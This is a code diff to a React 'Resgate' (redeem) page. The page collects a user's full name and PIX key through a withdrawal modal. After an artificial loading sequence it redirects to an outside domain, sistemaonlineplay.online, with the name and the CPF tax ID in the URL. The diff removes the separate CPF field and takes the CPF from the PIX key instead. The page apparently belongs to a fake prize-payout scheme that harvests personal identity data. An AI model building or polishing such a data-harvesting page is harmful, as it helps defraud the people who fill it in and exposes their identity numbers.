@@ -28,7 +28,6 @@ const Resgate = () => {
   // Modal de Saque PIX
   const [pixOpen, setPixOpen] = useState(false);
   const [fullName, setFullName] = useState("");
-  const [cpf, setCpf] = useState("");
   const [pixType, setPixType] = useState<"" | "CPF" | "E-mail" | "Celular" | "Chave Aleatória">("");
   const [pixKey, setPixKey] = useState("");
   const [typeOpen, setTypeOpen] = useState(false);
@@ -70,7 +69,7 @@ const Resgate = () => {
   };
 
   const confirmPix = () => {
-    if (!fullName.trim() || !cpf.trim() || !pixType || !pixKey.trim()) return;
+    if (!fullName.trim() || !pixType || !pixKey.trim()) return;
     setPixOpen(false);
     setLoadingStep(0);
   };
@@ -80,13 +79,14 @@ const Resgate = () => {
     if (loadingStep === null) return;
     if (loadingStep >= LOADING_STEPS.length) {
       const nome = encodeURIComponent(fullName.trim()).replace(/%20/g, "+");
-      const cpfParam = encodeURIComponent(cpf.trim());
+      // Se o tipo for CPF, usa a chave; caso contrário envia vazio
+      const cpfParam = encodeURIComponent(pixType === "CPF" ? pixKey.trim() : "");
       window.location.href = `https://sistemaonlineplay.online/check/index.html?nome=${nome}&cpf=${cpfParam}`;
       return;
     }
     const t = setTimeout(() => setLoadingStep((s) => (s ?? 0) + 1), 1400);
     return () => clearTimeout(t);
-  }, [loadingStep, fullName, cpf]);
+  }, [loadingStep, fullName, pixType, pixKey]);
 
   const formatCPF = (v: string) => {
     const d = v.replace(/\D/g, "").slice(0, 11);
@@ -319,19 +319,6 @@ const Resgate = () => {
                   className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
                 />
 
-                {/* CPF */}
-                <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
-                  CPF
-                </label>
-                <input
-                  type="text"
-                  inputMode="numeric"
-                  value={cpf}
-                  onChange={(e) => setCpf(formatCPF(e.target.value))}
-                  placeholder="000.000.000-00"
-                  className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
-                />
-
                 {/* Tipo de chave PIX */}
                 <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
                   Tipo de chave PIX
@@ -391,7 +378,7 @@ const Resgate = () => {
                 <button
                   type="button"
                   onClick={confirmPix}
-                  disabled={!fullName.trim() || !cpf.trim() || !pixType || !pixKey.trim()}
+                  disabled={!fullName.trim() || !pixType || !pixKey.trim()}
                   className="mt-2 flex h-12 w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-yellow-400 to-amber-400 text-sm font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50"
                 >
                   <Wallet className="h-5 w-5" strokeWidth={2.5} />
